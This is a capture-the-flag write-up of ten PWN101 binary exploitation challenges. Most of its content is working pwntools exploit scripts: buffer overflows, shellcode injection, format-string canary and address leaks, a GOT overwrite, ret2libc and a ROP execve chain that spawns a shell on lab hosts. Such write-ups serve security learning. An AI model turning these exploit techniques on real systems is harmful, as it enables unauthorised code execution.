# PWN101

### Challenge 1 - pwn101
The goal of this task was simply to overflow the buffer, I found that 100 characters were more than enough to do that, so I developed the following code:

    from pwn import *
    
    ip = "10.10.114.216"
    port = 9001
    p = remote(ip,port)
    
    offset = 100
    payload = b"A"*offset
    
    p.sendline(payload)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/2e84d354-224c-4fa8-b4b9-86305ffa26e5)<br />

### Challenge 2 - pwn102
Let's disassemble the binary in IDA:<br />
![image](https://github.com/user-attachments/assets/29a5aca3-d0a8-45cb-b047-ef27bc06936c)<br />
There's a buffer stored at rbp+var_70, and `var_70` is at -70h, which is 112 bytes from the beginning of the stack. Then, var_8 is at -8h, and var_4 is at -4h. To overwrite var_8 and var_4 I need an offset of 112 - 8 = 104 bytes. Then I need to overwrite these two variables with the values provided by the program.<br />
So I developed the following pwntools exploit:

    from pwn import *
    from struct import pack
    
    #p = process("./pwn102-1644307392479.pwn102")
    ip = "10.10.109.116"
    port = 9002
    
    p = remote(ip,port)
    
    offset = 104  # Offset corretto per riempire il buffer fino alle variabili
    payload = b"A" * offset
    payload += pack("<I", 0x0C0D3)   # Scriviamo su var_8 (prima nello stack)
    payload += pack("<I", 0x0C0FF33) # Scriviamo su var_4 (dopo var_8)
    
    p.sendline(payload)
    p.interactive()
`pack("<I", 0x0C0D3)` outputs the address in little endian format:<br />
![image](https://github.com/user-attachments/assets/4910ea60-6ed6-4121-90f0-d7daad62cea0)<br />

### Challenge 3 - pwn103
If I look at the binary with pwngdb, I can see that there's a function called `admins_only`:<br />
![image](https://github.com/user-attachments/assets/f0727e08-4d5a-4075-9a39-88c2bb520966)<br />
And this is the content of that function.<br />
![image](https://github.com/user-attachments/assets/e435b351-78ed-42d4-8b7e-41c169d132a0)<br />
Also, If I use checksec:<br />
![image](https://github.com/user-attachments/assets/bb12280d-02b0-47bd-a102-ab5704cce4b6)<br />
Only NX is enabled, which is not a problem. Since the binary is not PIE, the address of the function `admins_only` is alywas the same. To find it out, on gdb, run `info functions admins_only`. The address is `0x0000000000401554`.<br />
Now I need to find the offset to overflow the RIP. Using the binary, I learned that the point that is vulnerable to buffer overflow is in the "general" section. So I first have to press `3` to go in the general section, and then I can overflow a buffer and get a segmentation fault. To find the offset to this segmentation fault I used `cyclic` inside pwngdb:<br />
![image](https://github.com/user-attachments/assets/e268a98f-a9fc-45de-bc70-bef0a7150bee)<br />
The offset is 40 bytes. So I developed the following exploit:<br />

    from pwn import *
    
    #p = process("./pwn103-1644300337872.pwn103")
    ip = "10.10.109.116"
    port = 9003
    
    p = remote(ip,port)
    
    elf = ELF("./pwn103-1644300337872.pwn103")
    
    rop = ROP(elf)
    
    ret_addr = rop.find_gadget(["ret"])[0]
    
    p.sendline(b"3")
    
    offset = 40
    
    payload = b"A"*40
    payload += p64(ret_addr)
    payload += p64(0x0000000000401554)
    
    p.sendline(payload)
    
    p.interactive()
This code first sends the command `3`, and then sends the payload. Notice that I had to add a `ret` gadget because of stack alignment issues.<br />
![image](https://github.com/user-attachments/assets/31ffefbd-edd5-4b2d-ab65-04c08259206e)<br />

### Challenge 4 - pwn104
The program behaves like this: <br />
![image](https://github.com/user-attachments/assets/d614f503-2876-4121-9ae3-e52dc651ce58)<br />
Looking at the binary, it doesn't seem to contain any vulnerable function:<br />
![Screenshot 2025-03-17 143411](https://github.com/user-attachments/assets/af57de69-c1b3-4181-ad72-2f0808a5c1cc)<br />
However it is leaking the address of the buffer that I'm going to overflow. Also, if I run checksec, I get this:<br />
![Screenshot 2025-03-17 143800](https://github.com/user-attachments/assets/34041018-4b45-4eba-a1f7-a685a20635fc)<br />
The stack is executable. This means that I can overflow the buffer with shellcode, and then overwrite the RIP with the address of the shellcode.<br />
Let's find the offset. I use the following code to do that:

    from pwn import *
    
    io = process('./pwn104-1644300377109.pwn104')
    #print(io.recvregex(b':')) # read until we get the prompt
    
    io.recvline()
    io.sendline(cyclic(3000))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
![image](https://github.com/user-attachments/assets/50af6090-9313-455e-a70e-43e7a234caac)<br />
So the offset is `88`. The problem is that the address of the buffer changes at every execution. I don't really now why. Checksec says that the binary is not PIE, so it shouldn't be like that. Maybe I'm missing something. <br />
But it's not important. Since the program leaks the address of the buffer, I can use that as a reference. The code to exploit the binary is the following:<

    from pwn import *
    
    context.arch = 'amd64'  # Ensure architecture matches the binary
    
    # Start the process
    #p = process("./pwn104-1644300377109.pwn104")  # Change with actual binary name
    ip = "10.10.135.169"
    port = 9004
    
    p = remote(ip,port)
    
    # Receive the leaked buffer address
    p.recvuntil(b"I'm waiting for you at ")
    leaked_addr = int(p.recvline().strip(), 16)  # Convert leaked address to integer
    log.info(f"Leaked buffer address: {hex(leaked_addr)}")
    
    # Offset between buffer and RIP overwrite (88 bytes)
    padding = b"A" * 88  

    
    # Shellcode (executes /bin/sh)
    shellcode = asm(shellcraft.sh())
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    
    # NOP sled
    nop_sled = b"\x90" * 20  # Adjust size as needed
    payload = padding
    payload += p64(leaked_addr+100)  # Overwrite RIP with shellcode address
    payload += nop_sled + shellcode
    
    # Send the payload
    p.sendline(payload)
    
    # Interact with shell
    p.interactive()
Here I'm abusing the fact that even if the offset is at 88, the `read` function reads 200 bytes, so I can actually use that extra space to put my shellcode. So I add 88 bytes of "A"s, and then put some NOPs and then the shellcode, and then I jump to the NOP sled, which is the address of the buffer + something, I opted for 20.<br />
![image](https://github.com/user-attachments/assets/2fc2725f-5407-4e6a-b20a-07cc17a8b5bf)<br />

### Challenge 5 - pwn105
The first part of the binary takes two user inputs and sums them:<br />
![Screenshot 2025-03-21 093933](https://github.com/user-attachments/assets/21c3081b-28ca-472f-96a1-e5634bb517f3)<br />
Then:<br />
![Screenshot 2025-03-21 094039](https://github.com/user-attachments/assets/aeadb525-55c1-400c-8077-2c3527dda29e)<br />
The "test" instruction in this case checks if the numbers provided are negative, for example:<br />
![Screenshot 2025-03-21 094320](https://github.com/user-attachments/assets/d0327a3e-6fa1-4880-85de-64f97a42871b)<br />
In that case it exits. But if the sign of the sum is positive, then it just prints the sum. What we want is to send two positive numbers that cam be rapresented by the system as positive numbers, but such that their sum cannot, meaning their sum will result in an integer overflow, therefore represented as a negative number. After some trial and error, I found a number that works, which is `555555555555555`:<br />
![image](https://github.com/user-attachments/assets/bd238868-7ec6-4671-8f88-7000ab84955e)<br />
So now I just need to do the same thing on the remote host:<br />
![Screenshot 2025-03-21 095221](https://github.com/user-attachments/assets/f2c98059-fe0c-417b-903f-f0d9f328752f)<br />

### Challenge 6 - pwn106
Here's what the binary does:<br />
![image](https://github.com/user-attachments/assets/e8c747cd-9a24-4e6f-9704-34263d9e23ea)<br />
It takes user input and then calles `printf`, but without specifying any format. This allows user to send a payload of `%p`, which can be used to print values from the stack. That is because `%p` takes a value and prints it in hex, this means that my payload is going to take values from the stack itself and print them in hex.<br />
So the code I used is pretty straightforward:

    from pwn import *
    #p = process("./pwn106-user-1644300441063.pwn106-user")  # Cambia con il nome reale del binario
    
    ip = "10.10.135.169"
    port = 9006
    
    p = remote(ip,port)
    
    payload = b"%p" * 40

    p.sendline(payload)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/61adea96-dae1-45d3-b0fc-e86d5d67ca96)<br />
So now I take this bytes and try to hex-decode them on cyberchef:<br />
![image](https://github.com/user-attachments/assets/7792c2bf-0841-48fb-9833-58204c125e95)<br />
As you can see the flag is in there, it's a bit drunk but it's there lol, probably because I need to convert it in little endian.<br />
I simply asked chatGPT to do that for me, and that's how I got the flag.

### Challenge 7 - pwn107
This is how the program behaves:<br />
![Screenshot 2025-03-21 114528](https://github.com/user-attachments/assets/93232cd5-bf4b-48e3-aaf8-3d903b04c958)<br />
It takes two inputs from the user.<br />
And this is how IDA disassembles it:<br />
![image](https://github.com/user-attachments/assets/f1d397f6-9c85-4e8f-8212-fcc1f27b2b6a)<br />
There's also a hidden function that is not called by the main, which spawns a shell:<br />
![Screenshot 2025-03-21 114711](https://github.com/user-attachments/assets/0e672e3f-0b7b-4117-9c69-70720ea73476)<br />
The bad new is that it has all the defenses enabled D:<br />
![Screenshot 2025-03-21 114605](https://github.com/user-attachments/assets/7cd49870-45ba-4c3e-b6bb-a9e10a0968fe)<br />
This challenge is about bypassing those mitigations. The very first thing that I can do is use the first interaction with the binary to leak the value of the canary. That is thanks to a format string vulnerability, the binary is printing my input with `printf(buf)`. <br />
![Screenshot 2025-03-21 115203](https://github.com/user-attachments/assets/c84bf550-a09c-4e81-91e2-a0ec39126b07)<br />
The buffer is stored at -40h, which is 64 bits. So in order to leak the canary, I need to provide at least 8 times `%p`. The stack canary value, always ends with `00` (and also is completely different from other addresses, it almost looks random). After some trial and error, I found that the canary is at `%13$p`. <br />
![Screenshot 2025-03-21 150613](https://github.com/user-attachments/assets/5771f654-efdf-4522-bbbb-0a3846bb2507)<br />
Now I know the canary, so the stack canary is bypassed. Next thing I need to do is to use the same format string exploit to leak an address of the program itself, so that I can dynamically compute the base address of the code and then also compute the address of the `get_streak` function, effectively bypassing ASLR aswell.<br />
Now, what I know is that when a binary is PIE, it usually starts the .text section at around `0x55...`. So I decided to use the following code to leak a lot of addresses in the stack, until I find something that starts at `0x55`:

    from pwn import *
    
    i = 1  # Gli indici di %p nelle format string iniziano tipicamente da 1
    while i < 50:
        p = process("./pwn107-1644307530397.pwn107")
        p.recv()
    
    
        print(f"Trying with offset {i}..")
        # Convertiamo la stringa in bytes con .encode()
        payload = f"%{i}$p".encode()
        p.sendline(payload)
    
        p.sendline(b"thasks")
        i += 1
    
        p.interactive()
![image](https://github.com/user-attachments/assets/29388f5f-1c11-4893-a824-50701e6fa160)<br />

    Execution 1: 0x5619b2200000 (base address)
    Execution 2: 0x562544e00000 (base address)
    Execution 3: 0x5567a9d00000 (base address)
But the offset of the instruction remains the same every time. So I can still use the `objdump` tool to find what instruction is this: `objdump -D ./pwn107-1644307530397.pwn107 | grep 992`. Since the offset is always the same `992` should always be the offset of the same instruction. And this is the result:<br />
![image](https://github.com/user-attachments/assets/d823593e-0ad0-4f34-88da-fba421d4f240)<br />
Good, so now I can compute the base address, and therefore the address of the win function! The following code exploits the local binary:

    from pwn import *
    
    elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
    
    ip = '10.10.22.24'
    port = 9007
    #p = remote(ip,port)
    p = process()
    
    # stack canary is at %13$p
    p.sendline(b'%17$p %13$p')  
    p.recvuntil(b'streak: ')
    leaked = p.recvline().split()
    print(leaked)
    base = int(leaked[0], 16) - 0x992
    canary = int(leaked[1], 16)
    elf.address = base
    
    payload = b'A'*24  # found via trial and error (failing to place the canary in the right place results in a stack smashing error)
    payload += p64(canary)
    payload += b'A'*8 # Base address must be filled too
    payload += p64(base + 0x6fe) # address of a ret instruction, found using `objdump`
    payload += p64(elf.sym["get_streak"])
    
    p.sendline(payload)
    p.interactive()
![image](https://github.com/user-attachments/assets/26507b0e-4f7e-4f2d-8cb0-c0feb7d4a839)<br />
But for some reason it doesn't exploit the remote binary.. There must be some differences on the stack values, because I tried changing the leaked address of the program from `%17$p` to `$19$p` and it worked with that. I don't really know why.., so the code that exploits the remote program is:<br />

    from pwn import *
    
    elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
    
    ip = '10.10.115.182'
    port = 9007
    p = remote(ip,port)
    
    p.sendline(b'%19$p %13$p')  
    p.recvuntil(b'streak: ')
    leaked = p.recvline().split()
    print(leaked)
    base = int(leaked[0], 16) - 0x992
    canary = int(leaked[1], 16)
    elf.address = base
    
    payload = b'A'*24  # found via trial and error (failing to place the canary in the right place results in a stack smashing error)
    payload += p64(canary)
    payload += b'A'*8 # Base address must be filled too
    payload += p64(base + 0x6fe) # address of a ret instruction, found using `objdump`
    payload += p64(elf.sym["get_streak"])
    
    p.sendline(payload)
    p.interactive()

![Screenshot 2025-03-21 171016](https://github.com/user-attachments/assets/d264a3c5-013f-4f40-b291-1b308be6e913)<br />

### Challenge 8 - pwn108
This is how it behaves (I already tried with a format string payload xd):<br />
![image](https://github.com/user-attachments/assets/2fa95067-65be-47e6-97e6-260203c2c565)<br />
So it takes two user inputs, but this time only the second one is vulnerable to format string... The good new is that there's no ASLR active:<br />
![image](https://github.com/user-attachments/assets/d1492bba-4348-41fb-aba4-2b6e7a01d80b)<br />
Also, there's a function that spawns a shell, obviously not called by main, called "holidays":<br />
![image](https://github.com/user-attachments/assets/99d85dbf-2e9c-41a1-b11b-71ed51b6ac9f)<br />
Here I need to perform a GOT overwrite attack. To perform it, I first need to see at which offset the format string exploit starts to write itself in memory, I use this script:

    from pwn import *
    
    elf = context.binary = ELF('./pwn108-1644300489260.pwn108')
    p = process()
    
    p = process()
    p.sendline(b"test")
    p.recvuntil(b"[Your Reg No]:")
    p.sendline(b"%p %p %p %p %p %p %p %p %p %p")
    p.interactive()
And this is the output:<br />
![image](https://github.com/user-attachments/assets/8e98739e-55f4-4e95-82de-25861e3132e3)<br />
At the stack value number 10, it starts to write hex values of `%` and `%p`. On overwriting the GOT, pwntools is a god, this simple script will overwrite thee address of the "puts" function with the address of the "holidays" function:<br />

    from pwn import *
    
    elf = context.binary = ELF('./pwn108-1644300489260.pwn108')
    #p = process()
    
    ip = "10.10.115.182"
    port = 9008
    
    p = remote(ip,port)

    p.sendline(b"something")
    p.recvuntil(b"[Your Reg No]:")
    
    offset = 10  # Se il test di format string mostra un valore diverso, cambialo
    payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['holidays']})
    
    p.sendline(payload)
    
    p.interactive()

![image](https://github.com/user-attachments/assets/cc63b353-475b-4f43-9da1-e14e1656275e)<br />
Note that this exploit can only be done because the binary is only PARTIAL RELRO, meaning that the GOT can be changed during execution.

### Challenge 9 - pwn109
The binary has the following defenses:<br />
![image](https://github.com/user-attachments/assets/110240fb-96a0-4648-aea3-b07aebfbbb54)<br />
Also, analysis with IDA doesn't show any "win" function to jump to. Next, I use the following code to find the offset:

    from pwn import *
    
    io = process('./pwn109-1644300507645.pwn109')
    #print(io.recvregex(b'\n')) # read until we get the prompt
    io.recvline()
    io.sendline(cyclic(3000))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
![image](https://github.com/user-attachments/assets/188f2c62-169a-4c9b-9d8a-e02011d8d07a)<br />
Which is `40` bytes. How to exploit this? I believe this is a perfect case for a `ret2libc` attack. By leaking the libc base address via plt/got (running main twice) we can do a ret2libc attack and execute system("/bin/sh").

    from pwn import *
    
    elf = context.binary = ELF("./pwn109-1644300507645.pwn109")
    
    p = process()
    
    rop = ROP(elf)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
    ret_chain = [ret, ret, ret, ret, ret, ret]        # chain of 3 rets
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.sym['main']
    
    log.info(f'pop rdi: {hex(pop_rdi)}')
    log.info(f'puts@plt: {hex(puts_plt)}')
    log.info(f'puts@got: {hex(puts_got)}')
    log.info(f'main: {hex(main)}')
    
    offset = 40
    
    payload1 = flat(
        b'A' * offset,
        ret,
        pop_rdi,
        puts_got,
        puts_plt,
        main
    )
    
    p.sendline(payload1)
    
    p.recvline()
    
    p.interactive()
The code above will call the function puts in order to print the the address of the `puts` function inside the GOT table. Then, it will call `main` again so that we can use the leaked address of puts to compute the addresses of `system` and of `"/bin/sh"` and send them on the second payload. So the final payload to exploit the remote machine is this:

    from pwn import *
    
    elf = context.binary = ELF("./pwn109-1644300507645.pwn109")
    libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
    
        ip = "10.10.157.47"
        port = 9009
        
        p = remote(ip,port)
        #p = process()
        
        rop = ROP(elf)
        rop = ROP(elf)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
        puts_plt = elf.plt['puts']
        puts_got = elf.got['puts']
        main = elf.sym['main']
        
        log.info(f'pop rdi: {hex(pop_rdi)}')
        log.info(f'puts@plt: {hex(puts_plt)}')
        log.info(f'puts@got: {hex(puts_got)}')
        log.info(f'main: {hex(main)}')
        
        offset = 40
        
        payload1 = flat(
            b'A' * offset,
            ret,
            pop_rdi,
            puts_got,
            puts_plt,
            main
        )
        
        p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
        p.recvline()
        
        p.sendline(payload1)
        
        puts_leak = u64(p.recv(6) + b'\x00\x00')
        log.success(f'Leaked puts@libc: {hex(puts_leak)}')
        
        libc_base = puts_leak - libc.symbols['puts']
        system = libc_base + libc.symbols['system']
        bin_sh = libc_base + next(libc.search(b'/bin/sh'))
        
        log.success(f'libc base: {hex(libc_base)}')
        log.success(f'system: {hex(system)}')
        log.success(f'/bin/sh: {hex(bin_sh)}')
        
        payload2 = flat(
            b'A' * offset,
            ret,
            ret,
            pop_rdi,
            bin_sh,
            system
        )
        
        p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
        p.recvline()
        
        p.sendline(payload2)
        
        p.interactive()
Notice that I added 2 `ret` gadgets because the hint says so ahah it has probably something to do with a defense mechanism that I still have to study. Also, notice that the address of the libc library changes for the remote system. How did I find that? I used [this website](https://libc.rip/) in which you input the name of the function and the address that you leaked, and it lists all the libc versions that are compatible with it. <br />
![image](https://github.com/user-attachments/assets/25a47e47-3eda-47c1-96e2-eb8a81aa0962)<br />
So I basically started to try all of them until I found the right one.(you have to download it from the same site and put it in the directory containing the script)<br />
![image](https://github.com/user-attachments/assets/36075aad-9592-4540-af84-76eefbd0961a)<br />

### Challenge 10 - pwn110
![image](https://github.com/user-attachments/assets/97e02be0-b639-4745-8590-b9e5b7764428)<br />
These are the security measures in place:<br />
![image](https://github.com/user-attachments/assets/0d24141b-9f15-4d9b-ab39-45383005872e)<br />
How ever the stack canary doesn't seem to be in place, for some reason I can still get a segmentation fault:<br />
![image](https://github.com/user-attachments/assets/570293a9-b797-4e04-b0bc-dd13aa847803)<br />
Well, no complaints from my behalf.<br />
Again the offset is `40` bytes. 
But this time the binary is different:<br />
![image](https://github.com/user-attachments/assets/6a1a6518-879e-4149-a130-760373ba8b0f)<br />
As you can see, the binary is statically linked, this means that the libc is hardcoded into the .text section of the binary itself! ok now you might ask: how do I find system and "/bin/sh" inside the binary? None of them is in the binary. So the idea is to put "/bin/sh" into the buffer itself, and then do a syscall 59 (execve), that takes our buffer as input. Luckily for me, there's a tool that does this for me automatically. I just need to run `ROPgadget --binary pwn110-1644300525386.pwn110 --ropchain` and it will look for gadgets in the binary and output a payload to put inside my pwntools script, in order to spawn a shell. The final code I used for this exploit is:

    from pwn import *
    from struct import pack
    
    elf = context.binary = ELF("./pwn110-1644300525386.pwn110")
    
    ip = "10.10.130.113"
    port = 9010
    
    proc = remote(ip,port)
    
    #proc = process()
    # Padding goes here
    p = b'A'*40
    
    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e0) # @ .data
    p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
    p += b'/bin//sh'
    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
    p += pack('<Q', 0x00000000004c00e0) # @ .data
    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004012d3) # syscall
    
    proc.sendline(p)
    proc.interactive()

![image](https://github.com/user-attachments/assets/dfb21b58-0706-41a8-a259-f645430b4862)




